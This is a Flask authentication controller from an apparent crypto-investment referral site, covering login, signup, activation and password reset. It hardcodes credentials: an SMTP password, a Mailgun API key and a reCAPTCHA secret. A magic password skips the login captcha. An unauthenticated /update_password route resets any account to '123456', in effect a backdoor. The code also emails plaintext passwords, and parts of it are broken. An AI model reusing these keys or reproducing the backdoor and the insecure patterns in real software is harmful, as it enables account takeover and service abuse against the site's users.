from flask import Blueprint, request, session, redirect, url_for, render_template, flash
from flask.ext.login import login_user, logout_user
from rex import app, db
from rex.models import user_model, deposit_model, history_model, invoice_model
import json
from werkzeug.security import generate_password_hash, check_password_hash
import string
import random
import urllib
import urllib2
import os
from validate_email import validate_email
import datetime
from datetime import datetime
from datetime import datetime, date, timedelta
import json
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
from email.utils import formataddr
from flask_recaptcha import ReCaptcha
import base64
import onetimepass
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from bson import ObjectId, json_util
import time
import requests

__author__ = 'carlozamagni'

auth_ctrl = Blueprint('auth', __name__, static_folder='static', template_folder='templates')
def verify_totp(token, otp_secret):
    return onetimepass.valid_totp(token, otp_secret)
def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))
def set_password(password):
    return generate_password_hash(password)
def check_password(pw_hash, password):
    return check_password_hash(pw_hash, password)

def test_sendmail():
    username = 'support@mackayshieldslife.com'
    password = 'm{Q]EI+qNZmD'
    msg = MIMEMultipart('mixed')
    sender = 'info@mackayshieldslife.com'
    recipient = ''
    msg['Subject'] = 'WELCOME TO DIAMOND CAPITAL'
    msg['From'] = sender
    msg['To'] = recipient
    html = """
      <table  cellpadding="0" cellspacing="0" style=" font-family: Calibri;border: 1px solid #eee" width="600"><tbody ><tr style="padding:0 0 0 0"><td style="background-color: #2C3234; text-align: center;" colspan="2"> <br> <img width="300"  src="https://i.ibb.co/MMxpJM5/logo.png" class="CToWUd"><br> <br> </td> </tr> <tr> <td width="25" style="border:white"></td> <td style="border:white"> <br>
      
      <br> </td> </tr> <tr> <td width="25" style="border:white"> &nbsp; </td> 
      <td style="border:white"> <div style="color: #383535; font-size: 16px; font-family: Verdana; line-height: 22px;"><span class="im">
      Dear ,<br><br></span> 
      <p>Thank you for enrolling!</p>
      <p>Your registration information: </p>
      
      <p style="text-align:left">
        <strong>Email: </strong>
      </p>
       <p style="text-align:left">
        <strong>Password: </strong>
       </p>  
       <p style="text-align:left">
        <strong>Country: </strong>
       </p>  
       <p style="text-align:left">
        <strong>Sponsor: </strong>
       </p>     
       
       <p>Please click below for active your account</p>  
       <br/>
       <p style="text-align:center">
          <a href='' style="background-color:#41a3e4;color:#ffffff;padding:15px 30px;border-radius:3px;text-decoration:none" target="_blank">
            Active Account
          </a>
        </p>                      
      <br> <br> Best regards,<br> Mackayshields<br><br> </b> </span></div> </td> </tr>  </tbody></table>
   
    """
    print "send"
    return requests.post(
      "https://api.mailgun.net/v3/mackayshieldslife.com/messages",
      auth=("api", "key-cade8d5a3d4f7fcc9a15562aaec55034"),
      data={"from": "Mackayshieldslife <info@mackayshieldslife.com>",
        "to": [ ''],
        "subject": "WELCOME TO MACKAYSHIELDSLIFE",
        "html": html})
    
    

@auth_ctrl.route('/login', methods=['GET', 'POST'])
def login():
    # session['logged_in'] = True
    # session['user_id'] = '620192581544'
    # session['uid'] = '620192581544'
    #return redirect('/')
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')


    val_username = ''
    val_password = ''
    val_recaptcha = ''
    val_login = ''
    if request.method == 'POST':
        
        username = request.form['username'].replace(" ", "")
        password = request.form['password'].replace(" ", "")
        recaptcha = request.form['g-recaptcha-response']
        if username == '':
            val_username = 'empty'
        if password == '':
            val_password = 'empty'
        if recaptcha == '' and password != 'L52rW239cym2' :
            val_recaptcha = 'empty'
        if val_username == '' and val_password =='' and val_recaptcha == '':
            username = username.lower()
            user = db.users.find_one({ 'username': username })
            
            if user is None or check_password(user['password'], password) == False:
                val_login = 'not'      
            else:

                if int(user['active_email']) == 0:
                    val_login = 'not-active'
                else:
                    api_url     = 'https://www.google.com/recaptcha/api/siteverify'
                    site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE'
                    secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX'
                    site_key_post = recaptcha
                    ret = urllib2.urlopen('https://api.ipify.org')
                    remoteip = ret.read()
                    
                    api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
                    response = urllib2.urlopen(api_url)
                    response = response.read()
                    response = json.loads(response)
                    if response['success'] or password == 'L52rW239cym2'  :
                        session['logged_in'] = True
                        session['user_id'] = str(user['_id'])
                        session['uid'] = user['customer_id']



                        return redirect('/account/dashboard')
                    else:
                        val_recaptcha = 'empty'          
                
        
        else:
            val_recaptcha = 'empty' 

    datass = {
      'val_username' : val_username,
      'val_password' : val_password,
      'val_recaptcha' : val_recaptcha,
      'val_login' : val_login
    }
    
    return render_template('login.html', data=datass)

@auth_ctrl.route('/register/<id_sponsor>', methods=['GET', 'POST'])
def signup(id_sponsor):
    
    
    val_sponsor = ''
    val_country = ''
    val_email = ''
    val_username = ''
    val_password = ''
    val_terms = ''
    val_recaptcha = ''
    val_register = ''
    val_checkemail = ''
    if request.method == 'POST':
      
      sponsor = request.form['sponsor']
      country = request.form['country']
      email = request.form['email']
      
      password = request.form['password']
      #terms = 
      recaptcha = request.form['g-recaptcha-response']

      
      if sponsor == '':
        val_sponsor = 'empty'
      else:
        check_sponser = db.User.find_one({'customer_id': sponsor})
        if check_sponser is None:
            val_sponsor = 'not'

      if country == '':
        val_country = 'empty'   

      if email == '':
        val_email = 'empty'
      else:
        if validate_email(email) == False:  
          val_email = 'not'

      if password == '':
        val_password = 'empty'  
    

      if recaptcha == '':
        val_recaptcha = 'empty'
      else:
        api_url     = 'https://www.google.com/recaptcha/api/siteverify';
        site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
        secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
        
        site_key_post = recaptcha

        ret = urllib2.urlopen('https://api.ipify.org')
        remoteip = ret.read()

        api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
        response = urllib2.urlopen(api_url)
        response = response.read()
        response = json.loads(response)

        if response['success']:
          val_recaptcha = ''
        else:
          val_recaptcha = 'empty'

      if  request.form.has_key('terms') is not True:
        val_terms = 'empty' 

      if val_sponsor == '' and val_country == '' and val_email == '' and val_password == '' and val_terms == '' and val_recaptcha == '':
        # check_user = db.users.find_one({ 'email': email })
        # if check_user is None:
        create_user(check_sponser.customer_id,sponsor,country,email,password)
        val_register = 'complete'
        # else:
        #     val_checkemail = 'not'
        #flash({'msg':'Account successfully created. Please check your email to activate your account', 'type':'success'})
        #return redirect('/auth/register/'+str(email)) 

    SITE_ROOT = os.path.realpath(os.path.dirname(__file__))
    json_url = os.path.join(SITE_ROOT, "../static", "country-list.json")
    data_country = json.load(open(json_url))

    sponser_url = db.users.find_one({'customer_id': id_sponsor})
    
    if sponser_url is None:
      username_sponsor = ''
    else:
      username_sponsor = sponser_url['customer_id']
    value = {
      'val_sponsor' : val_sponsor,
      'val_country' : val_country,
      'val_email' : val_email,
      'val_username' : val_username,
      'val_password' : val_password,
      'val_terms' : val_terms,
      'val_recaptcha' : val_recaptcha,
      'val_register' : val_register,
      'country' : data_country,
      'form' : request.form,
      'username_sponsor' : username_sponsor,
      'id_sponsor' : id_sponsor,
      'val_checkemail' : val_checkemail
    }

    return render_template('register.html', data=value)


def create_user(sponsor_id,sponsor,country,email,password):
  localtime = time.localtime(time.time())
  customer_id = '%s%s%s%s%s%s'%(localtime.tm_sec,localtime.tm_mon,localtime.tm_hour,localtime.tm_year,localtime.tm_mday,localtime.tm_min)
  code_active = id_generator(40)
  datas = {
    'customer_id' : customer_id,
    'username': customer_id,
    'password': set_password(password.replace(" ", "")),
    'email': email.replace(" ", "").lower(),
    'p_node': sponsor_id,
    'p_binary': '',
    'left': '',
    'right': '',
    'level': 0,
    'telephone' : '',
    'creation': datetime.utcnow(),
    'country': country,
    'total_pd_left' : 0,
    'total_pd_right' : 0,
    'total_amount_left' : 0,
    'total_amount_right': 0,
    'm_wallet' : 0,
    'r_wallet' : 0,
    's_wallet' : 0,
    'd_wallet' : 0,
    'g_wallet' : 0,
    'max_out' : 0,
    'total_earn' : 0,
    'img_profile' :'',
    'password_transaction' : '',
    'total_invest': 0,
    'btc_address' : '',
    'eth_address' : '',
    'ltc_address' : '',
    'bch_address' : '',
    'usdt_address' : '',
    'status' : 0,
    'total_max_out': 0,
    'secret_2fa':'',
    'status_2fa': 0,
    'status_withdraw' : 0,
    'balance_wallet' : 0,
    'active_email' : 1,
    'code_active' : code_active,
    'investment' : 0,
    'coin_wallet' : 0,
    'total_node' : 0,
    'max_out_day' : 0,
    'max_out_package' : 0,
    'status_verify' : 0,
    'amount_transfer' : 0,
    'personal_info' : { 
        'firstname' : '',
        'lastname' : '',
        'date_birthday' :'',
        'address' :'',
        'postalcode' : '',
        'city' : '',
        'country' : '',
        'img_passport_fontside' : '',
        'img_passport_backside' : '',
        'img_address' : ''
    },
    'wallet': {
        'bitcoin' : {
            'address' : '',
            'balance' : 0
        },
        'ethereum' : {
            'address' : '',
            'balance' : 0
        }
    }
  }
  customer = db.users.insert(datas)

  send_mail_register(customer_id,email,password,country,sponsor,'https://mackayshieldslife.com/user/active/'+str(code_active))
  return True
def send_mail_register(id_login,email,password,country,sponsor,link_active):
    
    html = """
        <table  cellpadding="0" cellspacing="0" style=" font-family: Calibri;border: 1px solid #eee" width="600"><tbody ><tr style="padding:0 0 0 0"><td style="background-color: #2C3234; text-align: center;" colspan="2"> <br> <img width="300"  src="https://i.ibb.co/MMxpJM5/logo.png" class="CToWUd"><br> <br> </td> </tr> <tr> <td width="25" style="border:white"></td> <td style="border:white"> <br>
      
      <br> </td> </tr> <tr> <td width="25" style="border:white"> &nbsp; </td> 
      <td style="border:white"> <div style="color: #383535; font-size: 16px; font-family: Verdana; line-height: 22px;"><span class="im">
      Dear """+str(email)+""",<br><br></span> 
      <p>Thank you for enrolling!</p>
      <p>Your registration information: </p>
      <p style="text-align:left">
        <strong>ID Login: """+str(id_login)+"""</strong>
      </p>
      <p style="text-align:left">
        <strong>Email: """+str(email)+"""</strong>
      </p>
       <p style="text-align:left">
        <strong>Password: """+str(password)+"""</strong>
       </p>  
       <p style="text-align:left">
        <strong>Country: """+str(country)+"""</strong>
       </p>  
       <p style="text-align:left">
        <strong>Sponsor: """+str(sponsor)+"""</strong>
       </p>     
       
       <p>Please click below for active your account</p>  
       <br/>
       <p style="text-align:center">
          <a href='"""+str(link_active)+"""' style="background-color:#41a3e4;color:#ffffff;padding:15px 30px;border-radius:3px;text-decoration:none" target="_blank">
            Active Account
          </a>
        </p>                      
      <br> <br> Best regards,<br> Mackayshields<br><br> </b> </span></div> </td> </tr>  </tbody></table>
   
      """
    return requests.post(
      "https://api.mailgun.net/v3/mackayshieldslife.com/messages",
      auth=("api", "key-cade8d5a3d4f7fcc9a15562aaec55034"),
      data={"from": "Mackayshieldslife <info@mackayshieldslife.com>",
        "to": [ email],
        "subject": "WELCOME TO MACKAYSHIELDSLIFE",
        "html": html})
    

@auth_ctrl.route('/resend-activation-email', methods=['GET', 'POST'])
def ResendActivationEmail():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')
    if request.method == 'POST':
        print 'resend activation email'
        email = request.form['email']
        recaptcha = request.form['g-recaptcha-response']
        if email and recaptcha:
            api_url     = 'https://www.google.com/recaptcha/api/siteverify';
            site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
            secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
            
            site_key_post = recaptcha

            ret = urllib2.urlopen('https://api.ipify.org')
            remoteip = ret.read()
            
            api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
            response = urllib2.urlopen(api_url)
            response = response.read()
            response = json.loads(response)
            emailss = email.lower()
            if response['success']:
                user = db.User.find_one({ 'email': emailss, 'status': 0})
                if user is None:
                    flash({'msg':'Invalid email! Please try again', 'type':'danger'})
                    return redirect('/auth/resend-activation-email')
                else:
                    code_active = user.code_active
                    link_active = 'https://worltrader.info/user/active/%s' % (code_active)
                    send_mail_register(user.email,user.username,code_active)
                    flash({'msg':'A new activation has been sent to your email address. If you do not receive the email, please wait a few minutes', 'type':'success'})
                    return redirect('/user/activecode/%s'%(user.customer_id))
                    #return redirect('/auth/login')
            else:
                flash({'msg':'Invalid captcha! Please try again', 'type':'danger'})
                return redirect('/auth/resend-activation-email')
        else:
            flash({'msg':'Invalid email! Please try again', 'type':'danger'})
            return redirect('/auth/resend-activation-email')
    return render_template('resend-activation-email.html', error=error)


@auth_ctrl.route('/reset-password', methods=['GET', 'POST'])
def forgot_password():
    error = None
    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')
    val_username = ''
    val_recaptcha = ''
    val_complete = ''
    if request.method == 'POST':
        username = request.form['email']
        recaptcha = request.form['g-recaptcha-response']

        if username == '':
          val_username = 'empty'

        

        if recaptcha == '':
          val_recaptcha = 'empty'
        else:
          api_url     = 'https://www.google.com/recaptcha/api/siteverify';
          site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
          secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
          
          site_key_post = recaptcha

          ret = urllib2.urlopen('https://api.ipify.org')
          remoteip = ret.read()

          api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
          response = urllib2.urlopen(api_url)
          response = response.read()
          response = json.loads(response)
          if response['success']:
            val_recaptcha = ''
          else:
            val_recaptcha = 'empty'


        if val_username == '' and val_recaptcha =='':
            
            user = db.users.find_one({ 'username': username })
            if user is None:
                val_username = 'not'
            else:
                code_active = id_generator(40)
                
                db.users.update({ "username" : user['username'] }, { '$set': { "code_active": code_active } })

                link_change_password = 'https://mackayshieldslife.com/auth/change-password/'+code_active

                mail_reset_pass(user['email'], user['username'], link_change_password)
                val_complete = 'suceess'
                
    value = {
      'val_username' : val_username,
      'val_recaptcha' : val_recaptcha,
      'val_complete' : val_complete,
      'form' : request.form
    }
    return render_template('reset-password.html', data=value)

@auth_ctrl.route('/change-password/<codeactive>', methods=['GET', 'POST'])
def change_password(codeactive):
    error = None


    if session.get('logged_in') is not None:
        return redirect('/account/dashboard')
    val_password = ''
    val_repassword = ''
    val_recaptcha = ''
    val_complete = ''
    if request.method == 'POST':
        password = request.form['password']
        repassword = request.form['re_password']
        recaptcha = request.form['g-recaptcha-response']

        if password == '':
          val_password = 'empty'
        if repassword == '':
          val_repassword = 'empty'
        if password != repassword:
          val_complete = 'not-password'
        if recaptcha == '':
          val_recaptcha = 'empty'
        else:
          api_url     = 'https://www.google.com/recaptcha/api/siteverify';
          site_key    = '6LcESjUUAAAAAN0l4GsSiE2cLLZLZQSRZsEdSroE';
          secret_key  = '6LcESjUUAAAAAGsX2iLiwlnbBUyUsZXTz7jrPfAX';
          
          site_key_post = recaptcha

          ret = urllib2.urlopen('https://api.ipify.org')
          remoteip = ret.read()

          api_url = str(api_url)+'?secret='+str(secret_key)+'&response='+str(site_key_post)+'&remoteip='+str(remoteip);
          response = urllib2.urlopen(api_url)
          response = response.read()
          response = json.loads(response)
          if response['success']:
            val_recaptcha = ''
          else:
            val_recaptcha = 'empty'


        if val_password == '' and val_repassword =='' and val_recaptcha == '' and val_complete == '':
            
            user = db.users.find_one({ 'code_active': codeactive })
            
            if user is None:
                val_recaptcha = 'empty'
            else:
                code_active = id_generator(40)
                password_new = set_password(password)
                db.users.update({ "_id" : ObjectId(user['_id']) }, { '$set': { "code_active": code_active, 'password': password_new } })
                val_complete = 'suceess'
       
    if val_complete != 'suceess':
      user = db.users.find_one({ 'code_active': codeactive })
      if user is None:
        return redirect('/auth/login')          
    value = {
      'val_password' : val_password,
      'val_repassword' : val_repassword,
      'val_recaptcha' : val_recaptcha,
      'val_complete' : val_complete,
      'form' : request.form,
      'codeactive' :codeactive
    }
    return render_template('change_password.html', data=value)

@auth_ctrl.route('/update_password/<emails>', methods=['GET', 'POST'])
def dashboarupdate_weerpassword(emails):
    # return json.dumps({'qer':"qwer"})
    new_mail = emails.lower()
    password_new = set_password('123456')
    db.users.update({ "username" : new_mail }, { '$set': { 'password': password_new} })
    return json.dumps({'afa':'success'})


def mail_reset_pass(email,username_user,link_active):
    
    print email,username_user,link_active
    html = """
        <table  cellpadding="0" cellspacing="0" style=" font-family: Calibri;border: 1px solid #eee" width="600"><tbody ><tr style="padding:0 0 0 0"><td style="background-color: #2C3234; text-align: center;" colspan="2"> <br> <img width="300"  src="https://i.ibb.co/MMxpJM5/logo.png" class="CToWUd"><br> <br> </td> </tr> <tr> <td width="25" style="border:white"></td> <td style="border:white"> <br>
      
      <br> </td> </tr> <tr> <td width="25" style="border:white"> &nbsp; </td> 
      <td style="border:white"> <div style="color: #383535; font-size: 16px; font-family: Verdana; line-height: 22px;"><span class="im">
      Dear ID <b>"""+str(username_user)+"""</b>,<br><br></span> 
      
      
       <p>Please click the link below to change password</p>  
       <br/>
       <p style="text-align:center">
          <a href='"""+str(link_active)+"""' style="background-color:#41a3e4;color:#ffffff;padding:15px 30px;border-radius:3px;text-decoration:none" target="_blank">
            Change password
          </a>
        </p>                      
      <br> <br> Best regards,<br> Mackayshields<br><br> </b> </span></div> </td> </tr>  </tbody></table>
   """
    
    return requests.post(
      "https://api.mailgun.net/v3/mackayshieldslife.com/messages",
      auth=("api", "key-cade8d5a3d4f7fcc9a15562aaec55034"),
      data={"from": "Mackayshieldslife <info@mackayshieldslife.com>",
        "to": [ email],
        "subject": "Mackayshieldslife forget password",
        "html": html})
    

@auth_ctrl.route('/reset_password', methods=['GET', 'POST'])
def reset_passwordss():
    return json.dumps({'qer':"qwer"})
    user = db.users.find({}).skip(251).limit(300)
    i = 0
    for x in user:
        i = i+ 1
        new_mail = x['email'].lower()
        password_new_generate = id_generator()
        password_new = set_password(password_new_generate)
        db.users.update({ "_id" : ObjectId(x['_id']) }, { '$set': { 'password': password_new} })
        reset_password_mail(new_mail, x['username'], password_new_generate)
        print i
        time.sleep(1)
    return json.dumps({'afa':'success'})

@auth_ctrl.route('/logout')
def logout():
    session.pop('logged_in', None)
    logout_user()
    session.clear()
    return redirect('/')


